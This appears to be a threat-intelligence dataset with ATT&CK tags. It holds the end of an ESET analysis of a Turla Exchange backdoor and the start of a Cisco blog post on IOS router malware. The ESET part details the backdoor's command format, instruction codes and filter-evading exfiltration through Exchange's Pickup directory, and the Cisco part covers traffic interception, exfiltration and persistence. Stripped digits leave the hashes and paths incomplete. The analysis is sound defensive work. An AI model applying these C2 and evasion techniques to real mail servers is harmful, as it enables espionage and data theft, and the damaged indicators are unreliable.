Once decrypted  we see the different fields used to store information about the commands to be executed  In Figure     we can see some of the most important fields    At offset  x    the email address to which the result of the command is sent    At offset  x D  the instruction code  It corresponds to a function in the DLL    At offset  x    the first argument  It will be passed to the function represented by the instruction code  Figure       Hexadecimal dump of a decrypted container If an email containing this particular container  embedded in a JPG or in a PDF  is sent to a server compromised by  MALWARE_NAME   a calculator will be executed on the Microsoft Exchange server  In addition to the instruction code  x    which runs the executable given by the first argument  there are eight other instruction codes having up to three arguments  Table   describes the nine different backdoor instructions  Turla  MALWARE_NAME  One email away from remote code execution   Table   List of instruction codes Instruction CodeDescription Arg  Arg  Arg    x  Write a file  Execute it if it is an executable  Exe pathN AFile data  x  Delete a file File pathN AN A  x  Exfiltrate a file File pathSet to     to delete the fileN A  x  Execute a process  CreateProcess  Command lineN AN A  x  Execute a command line  cmd exe  c  Command line N AN A  x  Return   N AN AN A  x  Disable backdoor for N minutes  MinutesN AN A  x  Exfiltrate a file  duplicate function of  x    File PathSet to     to delete the fileN A  x  No op N AN AN A The detailed structure  in C like syntax  of the container is available Figure     struct encrypted container   int size    clear text container      encrypted with AES       struct container     Can contain multiple commands int CmdId    Unique ID to identify the container int rcptl    Recipient address length char rcpt rcptl     Recipient address  address to which the output data will be sent  command      list of commands   struct command   int InstId    Unique ID to identify this command int InstrCode    The instruction that will be executed int fpl    First parameter length char fp fpl     First parameter int spl    Second parameter length char sp spl     Second parameter int bpl    Third parameter length char bp bpl     Third parameter   Figure       Structure of the command container  C like syntax  When processing a container  the backdoor writes the CmdId value to a log file  located at the path c  Win  dows ServiceProfiles NetworkService AppData Roaming Microsoft Windows thumbcache     db   The backdoor checks it just before processing a new container  to check whether this container has already been processed  This is an anti replay mechanism  probably to avoid duplicate execution if the mail server somehow receives the same email multiple times  Finally  the command output is encrypted with AES and a PDF document or a JPG image is built using a format similar to that described earlier  Interestingly  it reuses the incoming PDF or JPG and replaces the command container with a container holding the output data  An email is then created using data  Turla  MALWARE_NAME  One email away from remote code execution   from the configuration and the destination address provided in the incoming container  For instance  it uses the following fields from winmail dat   SEND FROM   redacted noreply  redacted  COMMAND REPLY SUBJECT  Email confirmation COMMAND REPLY ATTACH NAME  Letter   redacted   prnt    Note  Instruction  List  Scanned  Untitled  report  filename  ATT       ticket  Form  Attachment  Information To send the email  it simply drops it in the folder  ExchangeInstallFolder  TransportRoles PickUp  and the filename starts with msg followed by the result of the GetTickCount function  According to the Microsoft documentation       The Pickup and replay directories are used by the Transport service on Mailbox servers and Edge Transport servers to insert message files directly into the transport pipeline Correctly formatted email message files that you copy to the Pickup or Replay directories are submitted for delivery Moreover  Exchange does not perform any security check on the email sent via this folder       Any security checks configured on a Receive connector  such as anti spam  anti malware  sender filtering  or recipient filtering actions  aren t performed on messages submitted through the Pickup directory or the Replay directory Thus  security solutions will not see the data exfiltrated through  MALWARE_NAME   which makes this malware very stealthy  An example of an email containing the result of  MALWARE_NAME  executing a command is shown in Figure     The recipient is reply example com   as specified in the incoming command container  The sender is noreply  example com   which is the address we choose to use to replace the redacted one specified in the original configuration  The subject header and the attachment name were selected from the lists in the configura   tion and the incoming PDF was re used to transport output data  Figure       Example of an email generated by  MALWARE_NAME  to send command output Turla  MALWARE_NAME  One email away from remote code execution   Miscellaneous Logging The companion DLL uses logging extensively  The log level can be customized in the configuration file  allowing logging only relevant information when the malware is implanted on a victim machine  The log files are encrypted with AES      Each log entry contained in the log files is encrypted separately and the thirty two first bytes of each log file contain the key  Regardless of the log s purpose  each log entry has the same format  as described in Figure    in C like syntax  struct log entry   DWORD total size  QWORD unknown     AES encryption begins here DWORD log code  DWORD hex value  DWORD unknown   DWORD data size  char data data size     Figure       Log entry structure in C like syntax The most important fields are    The log code field  each different code corresponds to a different logging event  For example  the log code  x C   corresponds to the execution of a handler    The hex value field  Used when the data are numerical  For example  it can contain the Instruction Code executed by the backdoor    The data field  Used to store text data  For example  it can contain the subject of the email  The log file names vary across the different samples but for the sample we analyzed  we identified the following six log files  Table   Description of the log files ComponentPath Description Transport AgentC  Windows serviceprofiles network   service appdata Roaming Microsoft  Windows    ad     ab  cd   e   b  a f   fd  Log the sender and the date of every email processed by the Exchange server Transport AgentC  Windows serviceprofiles network   service appdata Roaming Microsoft  Windows   cf a   e    c   d  f   c  d b  ba Error log Companion DLLC  Windows serviceprofiles network   service appdata Roaming Microsoft  Windows   b f a   b  eb    c e   b b d c  d Log the date at each execution of the DLL main Companion DLLC  Windows ServiceProfiles NetworkService AppData  Roaming Microsoft thumbcache idx db Log backdoor actions Companion DLLC  Windows ServiceProfiles NetworkService appdata  Local Temp msmodl dat Debug log Companion DLLC  Windows ServiceProfiles NetworkService AppData  Roaming Microsoft Windows thumbcache    db Log the command id  Used to protect against replay attacks  Turla  MALWARE_NAME  One email away from remote code execution   Automatic exfiltration If the configuration parameters SEND TIME and SEND AT NIGHT are set  a thread launched by the DLL main function will loop indefinitely  As shown in Figure     it first waits SEND TIME seconds and then checks if the exfiltration should only occur during the night or during working hours  In the latter case  it checks whether the hour is between       and       and if it is true  it re enters the sleep loop without exfiltrating any files  Figure       Exfiltration loop with night check  HexRays output  The exfiltration function  shown in Figure     loops over the files that match the SEND FILE specification  It is possible to include wildcards in the filename specification to match several different files  Then  for each file  it will send an email containing the file in either a JPG or a PDF attachment  The Backdoor section details the sending of the emails  Figure       Exfiltration loop  HexRays output  Even though we did not see Turla make use of it in the wild  we believe this functionality might be used to exfiltrate automatically the emails archived by the zip handler  as this handler does not implement any exfiltration mechanism   Turla  MALWARE_NAME  One email away from remote code execution       Evolution Even without the earliest versions of  MALWARE_NAME   we noticed some development effort between the different versions we have seen    There was an effort to obfuscate function names in the  NET Transport Agent    Some Indicators of Compromise are different in each sample    Mutex names    Log file names    AES key used by the backdoor    The oldest versions only support JPG attachments for the C C protocol  while the latest versions also support PDF documents      Linux variant In a previous section  we explained that most of the strings used by  MALWARE_NAME  are encrypted  It turns out that some decrypted strings contain strings that make sense only in a Unix environment  Figure    shows some of these strings that refer to Unix  For example  sendmail is a common executable used to send an email on Linux  Thus  piping email content with cat to sendmail is actually a common way to send an email in a Linux environment  Further  Postfix is an alternative mail server to sendmail   Figure       Linux strings in the Windows DLL These Unix artefacts in the Windows malware could be explained by the possible sharing of code between Windows and Unix implementations  Hence  the presence of these strings suggests  MALWARE_NAME  exists for Linux  That would not be surprising  given that many organizations have Linux mail servers     REMEDIATION     Cleaning The cleaning of  MALWARE_NAME  is not an easy task  Simply removing the two malicious files will break Microsoft Exchange   preventing everybody in the organization from sending and receiving emails  Note to other AV vendors  before adding a detection for the Transport Agent files  be aware that doing so without a proper cleaning routine will render your infected customer s exchange servers inoperable  so proceed with caution  Turla  MALWARE_NAME  One email away from remote code execution   Before actually removing the files  the malicious Transport Agent should be disabled  First  open  ExchangeInstallFolder  TransportRoles Agents agents config and check every DLL  All of the genuine Transport Agents should be signed either by Microsoft a trusted software vendor  The agents config file should be similar to Figure       xml version       encoding  utf       configuration   mexRuntime   monitoring   agentExecution timeLimitInMilliseconds              monitoring   agentList         agent name  Security Interop Agent  baseType   Microsoft Exchange Data Transport Smtp SmtpReceiveAgent  classFactory   Microsoft Exchange Security Interop  SecurityInteropAgentFactory  assemblyPath   c  program files microsoft Exchange Server v   bin  Microsoft Exchange Security Interop dll  enabled   true  IsCritical   true      agent name  Content Filter Agent  baseType   Microsoft Exchange Data Transport Routing RoutingAgent  classFactory   Microsoft Exchange Security Interop  ContentFilterAgentFactory  assemblyPath   c  program files microsoft Exchange Server v   bin  Microsoft Exchange Security Interop dll  enabled   true  IsCritical   true       agentList   settings      mexRuntime    configuration  Figure       agents config example In that example  the malicious DLL is Microsoft Exchange Security Interop dll and two related Transport Agents are registered    Security Interop Agent  called  name   in the following explanations    Content Filter Agent  called  name   in the following explanations  Then  on the Exchange server  execute the following PowerShell commands with admin rights  Disable TransportAgent  Identity  name   Disable TransportAgent  Identity  name   Uninstall TransportAgent  Identity  name   Uninstall TransportAgent  Identity  name   The malicious Transport Agents are now disabled  After that  it is possible to remove the two malicious files without breaking Microsoft Exchange  If you do not plan to re install the mail server  an important last step is to modify the passwords of all accounts that have administrative rights on the compromised server  Otherwise  attackers could access the server again to compromise it again  Turla  MALWARE_NAME  One email away from remote code execution       Mitigations Given that attackers have gained administrative privileges on the Exchange server  there are no bulletproof mitigations against this threat  However  these few recommendations can help to detect the compromise and to make the attacker s work harder    Use dedicated accounts for the administration of Exchange servers with strong  unique passwords and  if possible   FA    Monitor closely the usage of these accounts    Restrict PowerShell execution    Regularly check that all the installed Transport Agents are signed by a trusted provider     CONCLUSION In addition to their Turla Outlook backdoor        MALWARE_NAME  is another example that Turla operators have a large set of sophisticated  custom malware at their disposal  To our knowledge  this is the first time a malicious actor has leveraged a Microsoft Exchange Transport Agent to enable persistence on a mail server  This technique is very interesting as it allows them to receive commands and exfiltrate data without any filtering   MALWARE_NAME  is a very powerful piece of malware  It can spy on all the emails of the compromised organization but also execute commands  for example  to control other machines on the local network  This makes it a main hub in the breached network for Turla operators  We will continue to monitor Turla developments to help defenders to protect their networks  Indicators of Compromise can also be found on GitHub For any inquiries  or to make sample submissions related to the subject  contact us at  threatintel eset com  Turla  MALWARE_NAME  One email away from remote code execution      BIBLIOGRAPHY   B  KNOWLTON   Military Computer Attack Confirmed   New York Times               Online   Available  https   www nytimes com            technology   cyber html  r   ref technology    Accessed                MELANI    Technical Report about the Malware used in the Cyberespionage against RUAG                Online   Available  https   www melani admin ch melani en home dokumentation reports technical reports  technical report apt case ruag html     M  Untersinger   Quelle est la bonne  quation pour pacifier le cyberespace     Le Monde               Online   Available  https   www lemonde fr pixels article            course aux cyberarmes logiciels destructeurs dormants  le difficile apaisement du cyberespace                 html     A  Cherepanov    MALWARE_NAME   A successor to  MALWARE_NAME    ESET          A  Cherepanov   TeleBots are back  Supply chain attacks against Ukraine   ESET               Online   Available  https   www welivesecurity com            telebots back supply chain attacks against ukraine      ESET Research   Turla  MALWARE_NAME   A shift towards more generic tools                Online   Available  https   www welivesecurity com            turla  MALWARE_NAME  shift towards generic tools      Kaspersky GReAT   Shedding Skin   Turla s Fresh Faces                Online   Available  https   securelist com shedding skin turlas fresh faces            ESET Research    MALWARE_NAME  Paper  Peering into Turla s second stage backdoor   ESET               Online   Available  https   www welivesecurity com             MALWARE_NAME  paper peering turlas second stage backdoor      ESET Research   Gazing at  MALWARE_NAME    Turla s new second stage backdoor   ESET            Online   Available  https   www welivesecurity com wp content uploads         eset  MALWARE_NAME  pdf      D  Huss   Turla APT actor refreshes KopiLuwak JavaScript backdoor for use in G   themed attack                Online   Available  https   www proofpoint com us threat insight post  turla apt actor refreshes kopiluwak javascript backdoor use g   themed attack      J  I  Boutin   Turla s watering hole campaign  An updated Firefox extension abusing Instagram                Online   Available  https   www welivesecurity com             turlas watering hole campaign updated firefox extension abusing instagram       ESET Research   Diplomats in Eastern Europe bitten by a Turla  MALWARE_NAME    ESET            Online   Available  https   www welivesecurity com wp content uploads         ESET Turla  MALWARE_NAME  pdf      National Cyber Security Centre   Turla group using Neuron and Nautilus tools alongside Snake malware                Online   Available  https   www ncsc gov uk content files protected files article files Turla   group    using   Neuron   and   Nautilus   tools   alongside   Snake   malware   pdf      S  Tanase   Satellite Turla  APT Command and Control in the Sky                Online   Available  https   securelist com satellite turla apt command and control in the sky             GDATA    MALWARE_NAME    Deeper travel into kernel protection mitigation                Online   Available  https   www gdatasoftware com blog                MALWARE_NAME  deeper travel into kernel protection mitigation      ESET   Turla Outlook Backdoor             Online   Available  https   www welivesecurity com wp content uploads         Eset Turla Outlook Backdoor pdf      GReAT   APT Trends Report Q         Kaspersky Labs               Online   Available  https   securelist com apt trends report q                   Microsoft   Transport agents                Online   Available  https   docs microsoft com en us exchange transport agents exchange      help      Mozilla   What is the winmail dat attachment     Online   Available  https   support mozilla org en US kb what winmaildat attachment      Microsoft   The Z  Theorem Prover    Online   Available  https   github com Z Prover z       D  Strome   Configure the Pickup directory and the Replay directory                Online   Available  https    docs microsoft com en us exchange configure the pickup directory and the replay directory exchange      help   Turla  MALWARE_NAME  One email away from remote code execution      D  Strome   Pickup directory and Replay directory                Online   Available  https   docs microsoft com en us exchange pickup directory and replay directory exchange      help      M  Schlee   Hackers used Outlook for cyberattack on German government  report   Politico               Online   Available  https   www politico eu article report hackers used outlook for cyberattack on german government       IOCS     Hashes In order to avoid breaking a compromised Microsoft Exchange server  please read the Cleaning section before deleting any of the  MALWARE_NAME  files  SHA  hash  C   E   FBF  A  E DAE F  EEE   B   DB C Filename Microsoft Exchange Security Interop dll Component Transport Agent Compilation date            ESET Detection Name MSIL Turla A SHA  hash   EE    A C   CBEB A    A EC  C  B E  F  Filename exrwdb dll Component Companion DLL Compilation date            ESET Detection Name Win   Turla CC SHA  hash FF  B  B  BC  A B    F DB   E  AC   C    Filename Microsoft Exchange MessagingPolicies Search dll Component Transport Agent Compilation date            ESET Detection Name MSIL Turla A SHA  hash C FF    FDB    AB     D      D     A   F Filename BPA Transport dll Component Companion DLL Compilation date            ESET Detection Name Win   Turla CC SHA  hash F D  BB A  B  FC D    BE   CEE A         Filename Microsoft Exchange MessagingPolicies Search exe Component Transport Agent Compilation date            ESET Detection Name MSIL Turla A SHA  hash  A F     AF  DF     D     F   D     C    Filename BPA Transport dll Component Companion DLL Compilation date            ESET Detection Name Win   Turla CC SHA  hash A D A  FE EFFD  CCB          DDC  FBC CD Filename   Component Transport Agent Compilation date            ESET Detection Name MSIL Turla A Turla  MALWARE_NAME  One email away from remote code execution       Paths    tmp   winmail dat   C  Windows ServiceProfiles NetworkService appdata Local Temp msmocf xml   C  Windows ServiceProfiles NetworkService appdata Local Temp msmodl dat   C  Windows serviceprofiles networkservice appdata Roaming Microsoft  Windows    ad     ab  cd   e   b  a f   fd    C  Windows serviceprofiles networkservice appdata Roaming Microsoft  Windows   cf a   e    c   d  f   c  d b  ba   C  Windows serviceprofiles networkservice appdata Roaming Microsoft  Windows   b f a   b  eb    c e   b b d c  d   C  Windows ServiceProfiles NetworkService AppData Roaming Microsoft thumbcache idx db   C  Windows ServiceProfiles NetworkService AppData Roaming Microsoft Windows thumbcache    db    MITRE ATT CK TECHNIQUES TacticIdNameDescription Initial AccessT    Valid AccountsAttackers probably re used stolen credentials to deploy  MALWARE_NAME   ExecutionT    PowerShellA PowerShell script was used to install  MALWARE_NAME   Privilege EscalationT    Valid AccountsTo have Administrative rights  attackers probably used stolen credentials  DiscoveryT    System Network Configuration DiscoveryLightNeuron exfiltrates the result of the functions GetAdaptersInfo and GetComputerName  CollectionT    Automated CollectionDepending on the configuration   MALWARE_NAME  can collect the files in a specific path  T    Data from Local SystemUsing a backdoor function  attackers can exfiltrate any local file  T    Email CollectionLightNeuron collects all the emails matching one rules specified in its configuration  ExfiltrationT    Automated ExfiltrationDepending on the configuration   MALWARE_NAME  can exfiltrate files located in a specific path  T    Data EncryptedData is encrypted using AES  T    Exfiltration Over Command and Control ChannelData is exfiltratated using an email C C channel  T    Scheduled Transfer Depending on the configuration  automatic exfiltration can happen during the night or during working hours  Command and ControlT    Data ObfuscationC C data is hidden in PDF documents or JPG images using steganography  T    Standard Cryptographic ProtocolC C data is encrypted using AES  T    Standard Application Layer ProtocolC C communication uses emails ,['S0395']
https://blogs.cisco.com/security/evolution-of-attacks-on-cisco-ios-devices,"['enterprise-attack', 'Enterprise']","['defense-evasion', 'persistence', 'command-and-control', 'execution']","['Reduce Key Space', 'Weaken Encryption', 'Traffic Signaling', 'Network Device CLI', 'ROMMONkit', 'Non-Application Layer Protocol', 'Downgrade System Image', 'Modify System Image: Patch System Image']","['T1600', 'T1600', 'T1205', 'T1059', 'T1542', 'T1095', 'T1601', 'T1601', 'T1601', 'T1601', 'T1601', 'T1601', 'T1601']", Evolution of attacks on Cisco IOS devices   Cisco Blogs Skip to content Cisco Blogs   Security   Evolution of attacks on Cisco IOS devices October           Comments Security Evolution of attacks on Cisco IOS devices Graham Holmes While   MALWARE_NAME   is the latest identified malware targeting Cisco devices running Cisco IOS  we have identified and investigated six other malware incidents during the last four years that target Cisco devices running Cisco IOS  The nature of threats is evolving and Cisco will continue to adapt technology delivering trustworthy solutions that our customers can rely on  This also means that customers will need to evolve  fully utilizing the security tools that are available  as well as ensuring security best practices are in place  The malware used in these evolved Cisco IOS attacks show increasing levels of complexity in the type of modifications made to Cisco IOS  the behavior of its Command and Control  C C  network  when present   and the platforms they target  Before talking about specifics of each investigated malware incident  it is important to note that in all cases  no evidence has been found that attackers exploited a previously known or unknown vulnerability to install the malware  All available data points suggest either the use of compromised administrator credentials or physical access to the devices or images  The following table and associated description provides a brief overview of the malware samples  as well as an overview of the actions that Cisco took in response to those findings  The source of this information is internal analysis performed by Cisco forensics teams  Notes to table  INFECTION METHOD  Static means  modifications to the IOS binary stored in the device s flash   Runtime means  modifications performed to the runtime memory code without changes to the IOS binary in flash  REMOTE DETECTABILITY  refers to the means to remotely look for the presence of the malware on a compromised system through scanning systems and signatures  Other means of detecting modifications through memory analysis is possible in all cases  Incidents   and   The first two incidents were detected in      and      respectively  and were most likely custom malware targeting a specific victim  Those incidents were very basic  from a technical point of view  and involve binary patches to a Cisco IOS image  They allowed the modified IOS image file to be installed on the target routers  C      C    nm  and C       Devices affected were in the Cisco      and      family of routers  No other Cisco devices were identified as affected by this malware  The modification essentially affects the Diffie Hellman key exchange protocol in order to weaken the derived keying material  The result is that with casual inspection the encrypted traffic seems unmodified  but the effect is that an attacker could decrypt protected traffic with less effort than would normally be required  Platforms implementing Trust  MALWARE_NAME  technologies and signed binaries would not be affected by either one of those two malware examples  Incidents   and   Two new malware samples were identified in       both targeting the Cisco      series of devices  In both cases  the attacker leveraged compromised administrator credentials to modify the in memory copy of the Cisco IOS code  using debugging and troubleshooting Cisco IOS command line interface  CLI  commands  The primary purpose of the added code appears to be exfiltration of IPv  packets that match criteria set by the attacker  The targeted traffic is copied and those packets are then forwarded to a specified IP address that is under the control of the attacker  A secondary purpose is to provide NAT  Network Address Translation  capabilities  so an attacker is able to access an IPv  address within a compromised network that would normally not be reachable from the public Internet  ie  devices using RFC      addresses   Since both of these malware samples involved the modification of the in memory code for Cisco IOS  neither Trust  MALWARE_NAME  technologies nor image validation features would have detected or prevented the attack  But  because the modifications were performed on the in memory copy of Cisco IOS  neither attack would achieve persistency across device reloads  Incident   has only been detected in a single customer network  It was discovered while troubleshooting crashes on line cards on installed Cisco      devices  Forensic analysis of the associated core dumps found that this attack used a C C mechanism similar to Incident   to provide the malware with instructions for data exfiltration  What is unique in this incident is targeting of multi architecture line cards   something we have not seen in any other malware analyzed as of this writing  In both cases  the modifications were made to the in memory copy of the executable code for the Cisco IOS image  with no changes to the actual binary Cisco IOS image in flash   The use of signed Cisco IOS images would not be a defense  It does  however  highlight the need for strong protection of administrative credentials and authorization mechanisms for privileged access to any network device  Incident   Incident   was discovered in late      and affected Cisco       Cisco      and Cisco      devices  Like the malware seen in Incidents   and    the attack leveraged compromised administrative credentials to gain access to target devices for the purpose of installing the malware  This malware  however  showed an increase in complexity compared to previous malware analyzed  It is the only analyzed malware so far that is capable of persistence through both device reload as well as through Cisco IOS software upgrades  The malware has two separate components  An initial infection  where the ROMMON on the targeted Cisco device is modified to ensure persistence of the C C channel  A secondary infection occurs when the ROMMON is used to inject binary code into the in memory Cisco IOS image to support data exfiltration  Note  This malware does not modify the binary Cisco IOS image in flash  The ROMMON component of the malware handles the C C messages  which are embedded within the payload of ICMP packets delivered through the IPv  protocol  The secondary infection component is highly modular  and supports the loading and unloading of optional  modules   which are delivered to the device through the C C channel  One of the observed modules purpose is to exfiltrate device specific data via ICMP packets  This module creates an ICMP Echo Request packet with the data to be exfiltrated as its payload  Other modules provide NAT capabilities  so C C messages can reach devices that would otherwise not be accessible from the public Internet  and additional exfiltration capabilities for other traffic defined by the attacker  Like Incident    the use of signed IOS images would not prevent this attack  as the binary Cisco IOS image stored in flash is never modified  However  the ROMMON compromise  used to achieve persistence between reloads and Cisco IOS software upgrades  would not be successful with current devices that incorporate secure boot  trust  MALWARE_NAME  modules  and image signing capabilities  Incident     MALWARE_NAME   The last example  known as  MALWARE_NAME  and jointly disclosed by Cisco and Mandiant s FireEye   uses the same static modifications to the Cisco IOS binary seen in Incidents   and    It also uses a C C approach similar to the one observed in Incident    but uses TCP instead of ICMP for C C traffic  hence the name  MALWARE_NAME     MALWARE_NAME   like malware            and     CANNOT survive the installation of a known good Cisco IOS binary image  obtained from a known  trusted source and verified to have the correct hash values  Cisco actions to prevent and detect attacks against Cisco devices Since       the Cisco Secure Development Lifecycle framework has provided development teams with standards and requirements to ensure products are designed with protection features and capabilities  Boot time and run time security features  such as Trust  MALWARE_NAME  modules  secure boot  and memory protection are standard requirements  The goal of these features is to protect customers from remote code injection attacks or static modifications to Cisco IOS binary images  As soon as the first malware was detected  in the wild   forensics and analysis teams at Cisco began accelerating the development of detection capabilities  We ve developed forensics tools that can quickly validate the authenticity of IOS images from core dumps or in memory images  These are key tools used in incident response to help our customers confirm whether there is a compromise and the extent of such a compromise  Concurrently with the development of suc